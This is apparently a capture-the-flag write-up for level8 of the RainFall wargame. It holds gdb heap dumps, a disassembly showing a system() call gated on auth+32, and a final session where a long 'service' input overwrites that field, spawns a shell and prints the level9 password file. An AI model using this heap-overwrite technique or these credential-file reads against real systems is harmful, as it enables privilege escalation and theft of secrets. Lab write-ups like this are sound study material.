(decompiler avec ghidra pour aider, croiser info ghidra + gdb)

```
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/level8/level8 

Breakpoint 1, 0x08048569 in main ()
(gdb) c
Continuing.

Breakpoint 2, 0xb7e78850 in printf () from /lib/i386-linux-gnu/libc.so.6
(gdb) c
Continuing.
(nil), (nil) 
auth aaaa

Breakpoint 2, 0xb7e78850 in printf () from /lib/i386-linux-gnu/libc.so.6
(gdb) x/32wx ^CQuit
(gdb) finish
Run till exit from #0  0xb7e78850 in printf () from /lib/i386-linux-gnu/libc.so.6
0x804a008, (nil) 
0x08048596 in main ()
(gdb) x/32wx 0x804a008
0x804a008:	0x61616161	0x0000000a	0x00000000	0x00020ff1
0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a068:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a078:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) service aaaaaaaa
Undefined command: "service".  Try "help".
(gdb) c
Continuing.
service aaaaaaaaaaaaaaaaaaaaaaaaaaaaa

Breakpoint 2, 0xb7e78850 in printf () from /lib/i386-linux-gnu/libc.so.6
(gdb) c
Continuing.
0x804a008, 0x804a018 
login
$ 

Breakpoint 2, 0xb7e78850 in printf () from /lib/i386-linux-gnu/libc.so.6
(gdb) x/32wx 0x804a008
0x804a008:	0x61616161	0x0000000a	0x00000000	0x00000029
0x804a018:	0x61616120	0x61616161	0x61616161	0x61616161
0x804a028:	0x61616161	0x61616161	0x61616161	0x000a6161
0x804a038:	0x00000000	0x00020fc9	0x00000000	0x00000000
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a068:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a078:	0x00000000	0x00000000	0x00000000	0x00000000
```

2e version :
```
(gdb) b printf
Breakpoint 1 at 0x8048410
(gdb) r
Starting program: /home/user/level8/level8 

Breakpoint 1, 0xb7e78850 in printf () from /lib/i386-linux-gnu/libc.so.6
(gdb) c
Continuing.
(nil), (nil) 
auth 

Breakpoint 1, 0xb7e78850 in printf () from /lib/i386-linux-gnu/libc.so.6
(gdb) c
Continuing.
0x804a008, (nil) 
service

Breakpoint 1, 0xb7e78850 in printf () from /lib/i386-linux-gnu/libc.so.6
(gdb) x/32xw 0x804a008
0x804a008:	0x0000000a	0x00000000	0x00000000	0x00000011
0x804a018:	0x0000000a	0x00000000	0x00000000	0x00020fe1
0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a068:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a078:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) finish
Run till exit from #0  0xb7e78850 in printf () from /lib/i386-linux-gnu/libc.so.6
0x804a008, 0x804a018 
0x08048596 in main ()
(gdb) x/32xw 0x804a008
0x804a008:	0x0000000a	0x00000000	0x00000000	0x00000011
0x804a018:	0x0000000a	0x00000000	0x00000000	0x00020fe1
0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a068:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a078:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) c
Continuing.
service

Breakpoint 1, 0xb7e78850 in printf () from /lib/i386-linux-gnu/libc.so.6
(gdb) finish
Run till exit from #0  0xb7e78850 in printf () from /lib/i386-linux-gnu/libc.so.6
0x804a008, 0x804a028 
0x08048596 in main ()
(gdb) x/32xw 0x804a008
0x804a008:	0x0000000a	0x00000000	0x00000000	0x00000011
0x804a018:	0x0000000a	0x00000000	0x00000000	0x00000011
0x804a028:	0x0000000a	0x00000000	0x00000000	0x00020fd1
0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a068:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a078:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) c
Continuing.
service

Breakpoint 1, 0xb7e78850 in printf () from /lib/i386-linux-gnu/libc.so.6
(gdb) x/32xw 0x804a008
0x804a008:	0x0000000a	0x00000000	0x00000000	0x00000011
0x804a018:	0x0000000a	0x00000000	0x00000000	0x00000011
0x804a028:	0x0000000a	0x00000000	0x00000000	0x00000011
0x804a038:	0x0000000a	0x00000000	0x00000000	0x00020fc1
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a068:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a078:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) c
Continuing.
0x804a008, 0x804a038 
login
$ 
```

il faut completer cette condition :
```
0x080486e2 <+382>:	mov    0x8049aac,%eax
0x080486e7 <+387>:	mov    0x20(%eax),%eax
0x080486ea <+390>:	test   %eax,%eax
0x080486ec <+392>:	je     0x80486ff <main+411>
0x080486ee <+394>:	movl   $0x8048833,(%esp)
0x080486f5 <+401>:	call   0x8048480 <system@plt>
0x080486fa <+406>:	jmp    0x8048574 <main+16>
0x080486ff <+411>:	mov    0x8049aa0,%eax
```
soit auth + 32 != NULL

```
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth 
0x804a008, (nil) 
service aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
0x804a008, 0x804a018 
login
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```